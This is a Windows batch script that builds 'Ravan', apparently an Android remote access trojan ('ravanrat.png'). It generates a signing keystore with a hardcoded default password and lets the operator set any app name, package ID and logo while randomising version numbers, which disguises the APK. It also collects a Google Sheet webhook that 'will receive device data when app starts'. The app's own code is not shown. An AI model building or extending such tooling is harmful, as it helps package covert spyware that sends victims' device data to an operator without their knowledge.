@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul 2>&1

REM #################################################
REM          RAVAN APK BUILDER - Windows
REM                   v2.0
REM
REM  Developed by: Somesh
REM  GitHub: github.com/someshsrichandan
REM  LinkedIn: linkedin.com/in/someshsrichandan
REM #################################################

title Ravan APK Builder v2.0 - by Somesh

REM Get script directory
set "SCRIPT_DIR=%~dp0"
set "PROJECT_DIR=%SCRIPT_DIR%.."
set "CONFIG_FILE=%SCRIPT_DIR%build_config.txt"
set "DEFAULT_LOGO=%PROJECT_DIR%\ravanrat.png"

goto :main_menu

:print_banner
cls
echo.
echo [91m╔══════════════════════════════════════════════════════════════╗[0m
echo [91m║                                                              ║[0m
echo [91m║     ██████╗  █████╗ ██╗   ██╗ █████╗ ███╗   ██╗              ║[0m
echo [91m║     ██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║              ║[0m
echo [91m║     ██████╔╝███████║██║   ██║███████║██╔██╗ ██║              ║[0m
echo [91m║     ██╔══██╗██╔══██║╚██╗ ██╔╝██╔══██║██║╚██╗██║              ║[0m
echo [91m║     ██║  ██║██║  ██║ ╚████╔╝ ██║  ██║██║ ╚████║              ║[0m
echo [91m║     ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝              ║[0m
echo [91m║                                                              ║[0m
echo [91m║                    APK BUILDER v2.0                          ║[0m
echo [91m║                                                              ║[0m
echo [91m╠══════════════════════════════════════════════════════════════╣[0m
echo [95m║  Developed by: Somes                                         ║[0m
echo [95m║  GitHub:   https://github.com/somes                          ║[0m
echo [95m║  LinkedIn: https://linkedin.com/in/somes                     ║[0m
echo [91m╚══════════════════════════════════════════════════════════════╝[0m
echo.
goto :eof

:check_requirements
echo [96m[*] Checking requirements...[0m
echo.

REM Check Java
where java >nul 2>nul
if %errorlevel% neq 0 (
    echo [91m[!] Java is not installed.[0m
    echo.
    echo [95m[^>] Options:[0m
    echo     1. Auto-install Java (download from web)
    echo     2. Show manual installation instructions
    echo     3. Skip (I'll install later)
    echo.
    set /p "JAVA_OPTION=    Choose option [2]: "
    if "!JAVA_OPTION!"=="" set "JAVA_OPTION=2"
    
    if "!JAVA_OPTION!"=="1" (
        call :install_java
    ) else if "!JAVA_OPTION!"=="2" (
        call :show_manual_java_install
        pause
        exit /b 1
    ) else (
        echo [93m[!] Skipping Java check. Build may fail.[0m
    )
) else (
    for /f "tokens=3" %%g in ('java -version 2^>^&1 ^| findstr /i "version"') do (
        echo [92m[✓] Java found: %%g[0m
    )
)

REM Check keytool
where keytool >nul 2>nul
if %errorlevel% equ 0 (
    echo [92m[✓] keytool found[0m
) else (
    echo [93m[!] keytool not found. Usually comes with JDK.[0m
)

echo.
goto :eof

:install_java
echo [96m[*] Opening Java download page...[0m
echo [93m    Please download and install JDK 11 or higher from:[0m
echo     https://adoptium.net/temurin/releases/
echo.
start "" "https://adoptium.net/temurin/releases/"
echo [93m[!] After installing Java, restart this script.[0m
pause
exit /b 1

:show_manual_java_install
echo.
echo [96m╔══════════════════════════════════════════════════════════════╗[0m
echo [96m║              MANUAL JAVA INSTALLATION GUIDE                  ║[0m
echo [96m╚══════════════════════════════════════════════════════════════╝[0m
echo.
echo [97mOption 1: Download from Adoptium (Recommended)[0m
echo     1. Go to: https://adoptium.net/temurin/releases/
echo     2. Download "JDK 11" or "JDK 17" for Windows x64
echo     3. Run the installer (choose "Add to PATH")
echo     4. Restart this script
echo.
echo [97mOption 2: Using winget (Windows 11)[0m
echo     winget install EclipseAdoptium.Temurin.11.JDK
echo.
echo [97mOption 3: Using Chocolatey[0m
echo     choco install temurin11
echo.
echo [97mOption 4: Using Scoop[0m
echo     scoop bucket add java
echo     scoop install temurin11-jdk
echo.
goto :eof

:generate_keystore
set "KEYSTORE_PATH=%PROJECT_DIR%\ravan-keystore.jks"

REM Default values
set "KEY_ALIAS=ravan-key"
set "KEYSTORE_PASS=ravan123"
set "CN_NAME=Ravan Developer"
set "ORG_NAME=Ravan Security"
set "COUNTRY=US"
set "VALIDITY_DAYS=9125"

if exist "%KEYSTORE_PATH%" (
    if "%AUTO_KEYSTORE%"=="1" (
        echo [92m[OK] Keystore already exists[0m
        goto :eof
    )
    echo [93m[!] Keystore already exists at: %KEYSTORE_PATH%[0m
    set /p "REGENERATE=    Generate new keystore? (y/N): "
    if /i not "!REGENERATE!"=="y" (
        echo [92m[OK] Using existing keystore[0m
        goto :eof
    )
    del "%KEYSTORE_PATH%" >nul 2>nul
)

if not "%AUTO_KEYSTORE%"=="1" (
    echo [96m[*] Keystore Configuration[0m
    echo.
    echo [95m[^>] Enter keystore details (press Enter for defaults):[0m
    echo.
    set /p "KEY_ALIAS=    Key alias [ravan-key]: "
    if "!KEY_ALIAS!"=="" set "KEY_ALIAS=ravan-key"
    set /p "KEYSTORE_PASS=    Keystore password [ravan123]: "
    if "!KEYSTORE_PASS!"=="" set "KEYSTORE_PASS=ravan123"
    set /p "CN_NAME=    Your name [Ravan Developer]: "
    if "!CN_NAME!"=="" set "CN_NAME=Ravan Developer"
    set /p "ORG_NAME=    Organization [Ravan Security]: "
    if "!ORG_NAME!"=="" set "ORG_NAME=Ravan Security"
    set /p "COUNTRY=    Country code [US]: "
    if "!COUNTRY!"=="" set "COUNTRY=US"
) else (
    echo [96m[*] Auto-generating keystore with default values...[0m
)

echo.
echo [96m[*] Generating keystore...[0m

keytool -genkeypair -alias "!KEY_ALIAS!" -keyalg RSA -keysize 2048 -validity !VALIDITY_DAYS! -keystore "%KEYSTORE_PATH%" -storepass "!KEYSTORE_PASS!" -keypass "!KEYSTORE_PASS!" -dname "CN=!CN_NAME!, O=!ORG_NAME!, C=!COUNTRY!" 2>nul

if %errorlevel% equ 0 (
    echo [92m[OK] Keystore generated successfully![0m
    echo.
    
    REM Create keystore.properties for Gradle
    set "KEYSTORE_PROPS=%PROJECT_DIR%\keystore.properties"
    echo storeFile=ravan-keystore.jks> "!KEYSTORE_PROPS!"
    echo storePassword=!KEYSTORE_PASS!>> "!KEYSTORE_PROPS!"
    echo keyAlias=!KEY_ALIAS!>> "!KEYSTORE_PROPS!"
    echo keyPassword=!KEYSTORE_PASS!>> "!KEYSTORE_PROPS!"
    echo [92m[OK] Created keystore.properties for Gradle[0m
    
    REM Save to config
    echo KEYSTORE_PATH=%KEYSTORE_PATH%> "%CONFIG_FILE%"
    echo KEY_ALIAS=!KEY_ALIAS!>> "%CONFIG_FILE%"
    echo KEYSTORE_PASS=!KEYSTORE_PASS!>> "%CONFIG_FILE%"
    
    if not "%AUTO_KEYSTORE%"=="1" (
        REM Show certificate info
        echo [96m[*] Certificate fingerprint:[0m
        keytool -list -v -keystore "%KEYSTORE_PATH%" -storepass "!KEYSTORE_PASS!" -alias "!KEY_ALIAS!" 2>nul | findstr "SHA256:"
        echo.
    )
) else (
    echo [91m[!] Failed to generate keystore[0m
    if not "%AUTO_KEYSTORE%"=="1" pause
    exit /b 1
)
goto :eof

:configure_logo
echo [96m[*] Logo Configuration[0m
echo.

set "RES_DIR=%PROJECT_DIR%\app\src\main\res"

echo [95m[^>] Logo options:[0m
echo     1. Use default Ravan logo (ravanrat.png)
echo     2. Use custom logo (provide image path)
echo     3. Keep current logo (no change)
echo.
set /p "LOGO_OPTION=    Choose option [1]: "
if "!LOGO_OPTION!"=="" set "LOGO_OPTION=1"

set "LOGO_PATH="

if "!LOGO_OPTION!"=="1" (
    if exist "%DEFAULT_LOGO%" (
        set "LOGO_PATH=%DEFAULT_LOGO%"
        echo [92m[✓] Using default Ravan logo[0m
    ) else (
        echo [91m[!] Default logo not found at: %DEFAULT_LOGO%[0m
        goto :logo_done
    )
) else if "!LOGO_OPTION!"=="2" (
    set /p "CUSTOM_LOGO=    Enter path to logo image (PNG, 512x512): "
    if exist "!CUSTOM_LOGO!" (
        set "LOGO_PATH=!CUSTOM_LOGO!"
    ) else (
        echo [91m[!] Logo file not found: !CUSTOM_LOGO![0m
        goto :logo_done
    )
) else (
    echo [92m[✓] Keeping current logo[0m
    goto :logo_done
)

if not "!LOGO_PATH!"=="" (
    echo.
    set /p "TRANSPARENT=    Make background transparent? (y/N): "
    
    echo [96m[*] Processing logo...[0m
    
    REM KEY FIX: Remove adaptive icon definitions
    if exist "%RES_DIR%\mipmap-anydpi-v26" (
        rmdir /s /q "%RES_DIR%\mipmap-anydpi-v26"
        echo [93m[*] Removed adaptive icon config (forced legacy mode for PNG)[0m
    )
    
    REM Check for ImageMagick (magick command)
    where magick >nul 2>nul
    if %errorlevel% equ 0 (
        echo [93m[!] Using ImageMagick for resizing...[0m
        
        REM Helper function to resize
        call :resize_logo "!LOGO_PATH!" 48 "%RES_DIR%\mipmap-mdpi"
        call :resize_logo "!LOGO_PATH!" 72 "%RES_DIR%\mipmap-hdpi"
        call :resize_logo "!LOGO_PATH!" 96 "%RES_DIR%\mipmap-xhdpi"
        call :resize_logo "!LOGO_PATH!" 144 "%RES_DIR%\mipmap-xxhdpi"
        call :resize_logo "!LOGO_PATH!" 192 "%RES_DIR%\mipmap-xxxhdpi"
        
        if /i "!TRANSPARENT!"=="y" (
             echo [96m[*] Applying transparency...[0m
             call :transparent_logo "%RES_DIR%\mipmap-mdpi"
             call :transparent_logo "%RES_DIR%\mipmap-hdpi"
             call :transparent_logo "%RES_DIR%\mipmap-xhdpi"
             call :transparent_logo "%RES_DIR%\mipmap-xxhdpi"
             call :transparent_logo "%RES_DIR%\mipmap-xxxhdpi"
             echo [92m[✓] Transparency applied[0m
        )
        echo [92m[✓] Logo resized and copied to all densities[0m
    ) else (
        echo [93m[!] ImageMagick not found. Falling back to simple copy.[0m
        echo [93m    Note: Install ImageMagick to enable resizing and transparency.[0m
        
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-mdpi\ic_launcher.png" >nul
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-hdpi\ic_launcher.png" >nul
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xhdpi\ic_launcher.png" >nul
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xxhdpi\ic_launcher.png" >nul
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xxxhdpi\ic_launcher.png" >nul
        
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-mdpi\ic_launcher_round.png" >nul
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-hdpi\ic_launcher_round.png" >nul
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xhdpi\ic_launcher_round.png" >nul
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xxhdpi\ic_launcher_round.png" >nul
        copy /Y "!LOGO_PATH!" "%RES_DIR%\mipmap-xxxhdpi\ic_launcher_round.png" >nul
        
        echo [92m[✓] Logo copied (No resize)[0m
    )
)

goto :logo_done

:resize_logo
if not exist "%~3" mkdir "%~3"
magick convert "%~1" -resize %2x%2 "%~3\ic_launcher.png"
magick convert "%~1" -resize %2x%2 "%~3\ic_launcher_round.png"
goto :eof

:transparent_logo
magick convert "%~1\ic_launcher.png" -transparent white "%~1\ic_launcher.png"
magick convert "%~1\ic_launcher_round.png" -transparent white "%~1\ic_launcher_round.png"
goto :eof

:logo_done
echo.
goto :eof

:configure_app
echo [96m[*] App Configuration[0m
echo.

set "STRINGS_FILE=%PROJECT_DIR%\app\src\main\res\values\strings.xml"
set "BUILD_GRADLE=%PROJECT_DIR%\app\build.gradle"

REM Generate random numbers for version
set /a RAND_MAJOR=%RANDOM% * 9 / 32768 + 1
set /a RAND_MINOR=%RANDOM% * 9 / 32768
set /a RAND_PATCH=%RANDOM% * 9 / 32768
set "RAND_VER_NAME=%RAND_MAJOR%.%RAND_MINOR%.%RAND_PATCH%"
set /a RAND_VER_CODE=%RANDOM% * 990 / 32768 + 10

REM Package Name
echo [95m[^>] Enter Package Name (Application ID) [com.security.ravan]:[0m
set /p "PKG_NAME=    "
if "!PKG_NAME!"=="" set "PKG_NAME=com.security.ravan"

REM App Name
echo [95m[^>] Enter App Name [Ravan Security]:[0m
set /p "APP_NAME=    "
if "!APP_NAME!"=="" set "APP_NAME=Ravan Security"

REM Min SDK
echo [95m[^>] Enter Min SDK [26]:[0m
set /p "MIN_SDK=    "
if "!MIN_SDK!"=="" set "MIN_SDK=26"

REM Version Name
echo [95m[^>] Enter Version Name (Random: !RAND_VER_NAME!) [!RAND_VER_NAME!]:[0m
set /p "VERSION_NAME=    "
if "!VERSION_NAME!"=="" set "VERSION_NAME=!RAND_VER_NAME!"

REM Version Code
echo [95m[^>] Enter Version Code (Random: !RAND_VER_CODE!) [!RAND_VER_CODE!]:[0m
set /p "VERSION_CODE=    "
if "!VERSION_CODE!"=="" set "VERSION_CODE=!RAND_VER_CODE!"

REM Update build.gradle using PowerShell for reliability with regex replacement
if exist "%BUILD_GRADLE%" (
    REM Update Application ID
    powershell -Command "(Get-Content '%BUILD_GRADLE%') -replace 'applicationId \"[^\"]+\"', 'applicationId \"!PKG_NAME!\"' | Set-Content '%BUILD_GRADLE%'"
    
    REM Update Min SDK
    powershell -Command "(Get-Content '%BUILD_GRADLE%') -replace 'minSdk \d+', 'minSdk !MIN_SDK!' | Set-Content '%BUILD_GRADLE%'"
    
    REM Update Version Code and Name
    powershell -Command "(Get-Content '%BUILD_GRADLE%') -replace 'versionCode [0-9]+', 'versionCode !VERSION_CODE!' | Set-Content '%BUILD_GRADLE%'"
    powershell -Command "(Get-Content '%BUILD_GRADLE%') -replace 'versionName \".*\"', 'versionName \"!VERSION_NAME!\"' | Set-Content '%BUILD_GRADLE%'"
    
    echo [92m[✓] build.gradle updated (Pkg: !PKG_NAME!, MinSdk: !MIN_SDK!, Ver: !VERSION_NAME!)[0m
)

REM Update strings.xml
if exist "%STRINGS_FILE%" (
    powershell -Command "(Get-Content '%STRINGS_FILE%') -replace '<string name=\"app_name\">.*</string>', '<string name=\"app_name\">!APP_NAME!</string>' | Set-Content '%STRINGS_FILE%'"
    echo [92m[✓] App name set to: !APP_NAME![0m
)

REM Save to config
echo APP_NAME=!APP_NAME!>> "%CONFIG_FILE%"
echo VERSION_NAME=!VERSION_NAME!>> "%CONFIG_FILE%"
echo VERSION_CODE=!VERSION_CODE!>> "%CONFIG_FILE%"

REM Google Sheet URL
echo.
echo [95m[^>] Google Sheet Webhook Configuration[0m
echo [93m    This URL will receive device data when app starts.[0m
echo [93m    You need to set up Google Sheet manually (see README).[0m
echo [93m    Leave empty to skip.[0m
echo.
set /p "SHEET_URL=    Enter Google Sheet webhook URL: "

if not "!SHEET_URL!"=="" (
    echo SHEET_URL=!SHEET_URL!>> "%CONFIG_FILE%"
    echo [92m[✓] Google Sheet URL saved to config[0m
) else (
    echo [93m[!] Skipping Google Sheet configuration[0m
)

echo.
goto :eof

:build_apk
echo [96m[*] Building APKs...[0m
echo.

cd /d "%PROJECT_DIR%"

REM Load config if exists
if exist "%CONFIG_FILE%" (
    for /f "tokens=1,2 delims==" %%a in (%CONFIG_FILE%) do (
        set "%%a=%%b"
    )
)

REM Check if keystore exists - auto-generate if not
set "KEYSTORE_FILE=%PROJECT_DIR%\ravan-keystore.jks"
if not exist "!KEYSTORE_FILE!" (
    echo [93m[!] No keystore found. Auto-generating...[0m
    set "AUTO_KEYSTORE=1"
    call :generate_keystore
    set "AUTO_KEYSTORE="
    echo.
)

REM Create output folder
set "OUTPUT_DIR=%SCRIPT_DIR%output"
if not exist "!OUTPUT_DIR!" mkdir "!OUTPUT_DIR!"

REM Generate timestamp
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set "TIMESTAMP=!datetime:~0,8!_!datetime:~8,6!"

REM Create safe app name
set "APP_NAME_SAFE=!APP_NAME: =_!"
if "!APP_NAME_SAFE!"=="" set "APP_NAME_SAFE=Ravan"
if "!VERSION_NAME!"=="" set "VERSION_NAME=2.0"

set "APK_FOUND=0"

REM ---------------------------------------------------------
REM 1. Build Signed APK
REM ---------------------------------------------------------
echo [96m[*] Step 1/2: Generating Signed APK...[0m
echo.

call gradlew.bat clean assembleRelease

REM Signed release APK
set "RELEASE_APK=%PROJECT_DIR%\app\build\outputs\apk\release\app-release.apk"
if exist "!RELEASE_APK!" (
    set "OUTPUT_SIGNED=!OUTPUT_DIR!\!APP_NAME_SAFE!-v!VERSION_NAME!-signed-!TIMESTAMP!.apk"
    copy /Y "!RELEASE_APK!" "!OUTPUT_SIGNED!" >nul
    echo [92m[✓] Signed APK: !OUTPUT_SIGNED![0m
    set "APK_FOUND=1"
) else (
    echo [91m[!] Signed APK generation failed.[0m
)

REM ---------------------------------------------------------
REM 2. Build Unsigned APK
REM ---------------------------------------------------------
echo.
echo [96m[*] Step 2/2: Generating Unsigned APK...[0m
echo.

call gradlew.bat clean assembleRelease -PdisableSigning

REM Unsigned release APK
set "UNSIGNED_APK=%PROJECT_DIR%\app\build\outputs\apk\release\app-release-unsigned.apk"

REM Fallback check
if not exist "!UNSIGNED_APK!" (
    set "UNSIGNED_APK_FALLBACK=%PROJECT_DIR%\app\build\outputs\apk\release\app-release.apk"
    if exist "!UNSIGNED_APK_FALLBACK!" set "UNSIGNED_APK=!UNSIGNED_APK_FALLBACK!"
)

if exist "!UNSIGNED_APK!" (
    set "OUTPUT_UNSIGNED=!OUTPUT_DIR!\!APP_NAME_SAFE!-v!VERSION_NAME!-unsigned-!TIMESTAMP!.apk"
    copy /Y "!UNSIGNED_APK!" "!OUTPUT_UNSIGNED!" >nul
    echo [92m[✓] Unsigned APK: !OUTPUT_UNSIGNED![0m
    set "APK_FOUND=1"
) else (
    echo [91m[!] Unsigned APK generation failed.[0m
)

if "!APK_FOUND!"=="0" (
    echo.
    echo [91m╔══════════════════════════════════════════════════════════════╗[0m
    echo [91m║                      BUILD FAILED!                           ║[0m
    echo [91m╚══════════════════════════════════════════════════════════════╝[0m
    echo.
    echo [91m[!] No APK files found. Check errors above.[0m
    echo [93m[!] Common fixes:[0m
    echo     - Run Full Build (option 1) first to generate keystore
    echo     - Ensure Java 11+ is installed and in PATH
    echo     - Check internet connection
    echo     - Run: gradlew --stop ^&^& gradlew clean
    pause
    exit /b 1
)

echo.
echo [92m╔══════════════════════════════════════════════════════════════╗[0m
echo [92m║                    BUILD SUCCESSFUL!                         ║[0m
echo [92m╚══════════════════════════════════════════════════════════════╝[0m
echo.
echo [92m[✓] APKs saved to: !OUTPUT_DIR![0m
echo.
echo [95m╔══════════════════════════════════════════════════════════════╗[0m
echo [95m║  Developed by: Somesh                                        ║[0m
echo [95m║  GitHub:   https://github.com/someshsrichandan              ║[0m
echo [95m║  LinkedIn: https://linkedin.com/in/someshsrichandan         ║[0m
echo [95m╚══════════════════════════════════════════════════════════════╝[0m
echo.

set /p "OPEN_FOLDER=    Open output folder? (Y/n): "
if /i not "!OPEN_FOLDER!"=="n" (
    explorer "!OUTPUT_DIR!"
)
goto :eof

:main_menu
call :print_banner

echo [95m[^>] Build Options:[0m
echo.
echo     1. Start Build (Configure & Build)
echo     2. Generate Keystore Only
echo     3. Configure Logo Only
echo     4. Configure App Settings Only
echo     5. Check/Install Requirements
echo     6. Exit
echo.
set /p "MENU_OPTION=    Choose option [1]: "
if "!MENU_OPTION!"=="" set "MENU_OPTION=1"

echo.

if "!MENU_OPTION!"=="1" (
    call :check_requirements
    call :generate_keystore
    call :configure_logo
    call :configure_app
    call :build_apk
) else if "!MENU_OPTION!"=="2" (
    call :check_requirements
    call :generate_keystore
) else if "!MENU_OPTION!"=="3" (
    call :configure_logo
) else if "!MENU_OPTION!"=="4" (
    call :configure_app
) else if "!MENU_OPTION!"=="5" (
    call :check_requirements
    call :show_manual_java_install
) else if "!MENU_OPTION!"=="6" (
    echo [96m[*] Goodbye![0m
    echo [95m    Follow: https://github.com/someshsrichandan[0m
    exit /b 0
) else (
    echo [91m[!] Invalid option[0m
    pause
    exit /b 1
)

echo.
echo [92m[✓] Done![0m
echo.
pause
